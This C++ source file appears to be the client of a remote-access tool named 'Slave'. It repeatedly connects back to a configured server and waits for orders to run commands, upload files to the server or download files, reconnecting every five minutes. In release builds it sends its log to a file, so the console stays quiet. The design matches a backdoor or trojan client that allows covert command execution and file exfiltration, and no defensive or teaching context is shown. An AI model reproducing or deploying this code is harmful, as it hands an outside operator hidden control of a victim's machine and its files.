#include "Slave.h"
#include <iostream>
#include <fstream>
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <eztcp/eztcp.h>
#include "rcmd_orders.h"
#include "cmdprocs.h"

// ===== global variables =====
eztcp::Session* g_to_server_p = nullptr;
std::ofstream sout("./log");

// ===== loggings =====

void init_logging()
{
	std::clog << "target server: ip=" << g_server_ip_ps << ", port=" << g_server_port << std::endl;
}

void connecting_logging()
{
	std::clog << "connecting to server" << std::endl;
}

void connected_logging()
{
	std::clog << "connected to server" << std::endl;
}

void error_logging(eztcp::err::SocketError& e)
{
	std::clog << "SockerError: " << e.what() << std::endl;
}

//==============================================================================

void init()
{
#ifndef _DEBUG
	std::clog.rdbuf(sout.rdbuf());
#endif
	init_logging();
}

bool try_connect_server()
{
	try
	{
		if (g_to_server_p)
			delete g_to_server_p;
		connecting_logging();
		g_to_server_p = new eztcp::Session(g_server_ip_ps, g_server_port);
		connected_logging();
		return true;
	}
	catch (eztcp::err::SocketError& e)
	{
		error_logging(e);
		return false;
	}
}

void wait_order_and_proc()
{
	while (true)
	{
		eztcp::BlockPack arg_pack;
		switch (recv_order(*g_to_server_p, arg_pack))
		{
		case RCMD_PULSE:
			pulse_proc(*g_to_server_p, arg_pack);
			break;
		case RCMD_EXECUTE_CMD:
			execute_cmd_proc(*g_to_server_p, arg_pack);
			break;
		case RCMD_SEND_FILE:
			send_file_proc(*g_to_server_p, arg_pack);
			break;
		case RCMD_RECV_FILE:
			recv_file_proc(*g_to_server_p, arg_pack);
			break;
		default:
			send_feedback(*g_to_server_p, RCMD_ORDER_ERROR);
			break;
		}
	}
}

void sleep_a_while()
{
	std::clog << "sleep for 5 minutes" << std::endl;
	for (int i = 0; i < 5; ++i)
	{
		Sleep(60000);
	}
}

int main()
{
	init();
	while (true)
	{
		try
		{
			if (try_connect_server())
				wait_order_and_proc();
			else
				sleep_a_while();
		}
		catch (eztcp::err::SocketError& e)
		{
			error_logging(e);
		}
	}
	sout.close();
}
